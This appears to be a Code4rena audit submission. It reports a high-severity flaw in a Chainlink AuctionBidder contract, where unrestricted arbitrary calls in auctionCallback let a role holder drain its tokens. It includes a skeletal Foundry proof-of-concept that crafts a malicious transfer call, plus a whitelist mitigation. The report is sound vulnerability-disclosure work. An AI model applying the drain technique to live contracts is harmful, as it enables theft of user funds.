# C4 Submission Form

## Severity rating

High

## Title

Unrestricted arbitrary call execution in `auctionCallback` allows AUCTION_BIDDER_ROLE to drain all contract funds via crafted `Call[]` payload

## Links to root cause

```
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L58
```

## Vulnerability details

---COPY FROM HERE---

## Finding description and impact

`AuctionBidder.auctionCallback()` ([L97-112](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/AuctionBidder.sol#L97)) decodes caller-supplied `Call[]` from the `data` parameter and passes it verbatim to `_multiCall()` ([Caller.sol L58-60](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/Caller.sol#L58)), which executes each `Call` via raw low-level `.call(data)` with **no restriction on target address or calldata selector**.

```solidity
// AuctionBidder.sol L97-112
function auctionCallback(uint256 amountOut, bytes calldata data) external override {
    // ... auction validation ...
    Call[] memory calls = abi.decode(data, (Call[]));
    _multiCall(calls);  // ← unrestricted arbitrary execution
    // ...
}

// Caller.sol L58-60
function _multiCall(Call[] memory calls) internal {
    for (uint256 i; i < calls.length; ++i) {
        (bool success,) = calls[i].target.call(calls[i].data); // ← no target/selector restriction
        // ...
    }
}
```

The `withdraw()` function requires `DEFAULT_ADMIN_ROLE`, confirming that arbitrary token transfers were never intended for `AUCTION_BIDDER_ROLE` holders. However, `_multiCall` bypasses this separation of privilege entirely.

### Impact

An `AUCTION_BIDDER_ROLE` holder can construct a `solution` containing `Call({target: tokenAddress, data: transfer(attacker, balance)})`, draining **all tokens** held by the `AuctionBidder` contract. This constitutes direct theft of funds.

While `AUCTION_BIDDER_ROLE` is admin-granted (not permissionless), in practice this role is given to automated solver bots — a compromised or malicious bot can exploit this immediately. The `withdraw()` admin-only pattern proves the protocol intended to restrict token movements to admins only.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IAuctionBidder {
    function bid(address asset, uint128 amount, bytes calldata solution) external;
}

interface ICaller {
    struct Call {
        address target;
        bytes data;
    }
}

contract C01_ArbitraryCallDrain is Test {
    // Attacker with AUCTION_BIDDER_ROLE constructs malicious solution
    function test_drainViaAuctionCallback() public {
        // 1. Encode a transfer call targeting the held token
        ICaller.Call[] memory maliciousCalls = new ICaller.Call[](1);
        maliciousCalls[0] = ICaller.Call({
            target: address(0xTOKEN),  // any ERC20 held by AuctionBidder
            data: abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(0xATTACKER),
                1000 ether  // entire balance
            )
        });

        bytes memory solution = abi.encode(maliciousCalls);

        // 2. Call bid() — auction transfers assetIn to AuctionBidder,
        //    then invokes auctionCallback which executes _multiCall
        //    with the attacker's crafted calls, draining the contract
        // IAuctionBidder(auctionBidder).bid(asset, amount, solution);

        // 3. Result: all tokens transferred to attacker BEFORE
        //    auction can pull assetOut
    }
}
```

## Recommended mitigation

Restrict `_multiCall` targets and selectors within `auctionCallback`:

```solidity
function auctionCallback(uint256 amountOut, bytes calldata data) external override {
    Call[] memory calls = abi.decode(data, (Call[]));

    // Option A: Whitelist allowed targets
    for (uint256 i; i < calls.length; ++i) {
        require(
            calls[i].target == address(s_auction) || s_allowedRouters[calls[i].target],
            "Unauthorized target"
        );
    }
    _multiCall(calls);
    // ...
}
```

Alternatively, replace arbitrary `_multiCall` with a dedicated swap executor that constrains both targets and function selectors.

---END COPY HERE---
